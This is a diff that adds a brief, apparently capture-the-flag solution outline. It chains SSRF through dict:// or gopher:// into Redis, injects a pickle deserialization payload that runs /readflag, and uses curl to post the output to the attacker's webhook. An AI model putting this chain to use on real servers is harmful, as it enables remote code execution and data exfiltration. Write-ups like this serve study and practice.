@@ -1,0 +1,5 @@
+==SSRF with pickle deserialization via redis
+-Craft pickle deserialization payload that run /readflag and pipe the output to curl into our webhook, place the stdout in POST data (-d @-)
+-You can use gopher or dict to trigger the ssrf
+-Easier with dict (dict://127.0.0.1:6379/hset jobs <jobsid> "picklepayload")
+-You can double check to /api/tracks/<jobsid>/status if the payload hasn't get executed
